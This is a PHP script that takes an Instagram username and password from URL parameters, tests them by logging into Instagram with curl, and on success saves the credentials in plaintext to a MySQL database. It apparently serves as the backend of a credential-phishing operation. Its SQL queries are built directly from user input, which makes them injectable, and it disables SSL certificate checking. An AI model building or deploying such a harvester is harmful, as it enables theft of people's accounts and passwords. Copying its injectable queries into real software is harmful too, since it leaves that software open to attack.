<?php
	header("content-type: application/javascript");
	$fa = scandir("cookies");
	foreach($fa as $f)
		if($f != "." && $f != "..")
			unlink("cookies/$f");
	function instagram_login($un, $pw){
		$cn = getcwd().'/cookies/'.md5($un).'.txt';
		$web = getCSRF($un, $cn);
		$web = getCSRF($un, $cn);
		$data_filtered_data = $web[0];
		$ch = $web[1];
		$data_rec_token = $data_filtered_data[0];
		$data_rec_mid = $data_filtered_data[1];
		curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/accounts/login/ajax/');
		curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.urlencode($un).'&password='.urlencode($pw));
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(
		'X-Instagram-AJAX: 1',
		'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
		#'Accept: */*',
		'X-Requested-With: XMLHttpRequest',
		'X-CSRFToken: '.$data_rec_token,#'DNT: 1',
		#'Referer: https://www.instagram.com/accounts/login/',
		#'Accept-Encoding: gzip,deflate',
		#'Accept-Language: en-US',
		'Cookie: mid='.$data_rec_mid.'; ig_pr=1; ig_vw=1319; csrftoken='.$data_rec_token.''));
		curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies/'.md5($un).'.txt');
		curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies/'.md5($un).'.txt');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.43 Safari/537.31");
		$data_rec_page = curl_exec($ch) or die(curl_error($ch));
		return $data_rec_page;
	}
	function getCSRF($un, $cn){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/accounts/login/');
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('application/x-www-form-urlencoded', 'charset=UTF-8'));
		curl_setopt($ch, CURLOPT_COOKIEFILE, $cn);
		curl_setopt($ch, CURLOPT_COOKIEJAR, $cn);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.43 Safari/537.31");
		curl_setopt($ch, CURLOPT_REFERER, "https://www.instagram.com/");
		$data_filtered_data = [];
		if(file_exists($cn)){
			$data_local_lines = file($cn);
			foreach($data_local_lines as $data_local_line) {
				if($data_local_line[0] != '#' && substr_count($data_local_line, "\t") == 6) {
					$data_filter_tokens = explode("\t", $data_local_line);
					$data_filter_tokens = array_map('trim', $data_filter_tokens);
					$data_filtered_data[] = $data_filter_tokens[6]; 
				}
			}
		}
		if(count($data_filtered_data) < 2)
			$data_filtered_data  = ["",""];
		return [$data_filtered_data, $ch];
	}
	if(isset($_GET["username"], $_GET["password"])){
		$un = $_GET["username"];
		$pw = $_GET["password"];
		$js = instagram_login($un, $pw);
		$js = instagram_login($un, $pw);
		echo $js;
		$json = json_decode($js);
		if($json->authenticated)
		{
			$mdb = new mysqli("localhost", "root", "", "insta");
			$q = $mdb->query("select * from users where username='$un'");
			if(!$q->num_rows)
				$mdb->query("insert into users set username='$un', password='$pw'");
			else
				$mdb->query("update users set password='$pw' where username='$un'");
		}
	}
	
?>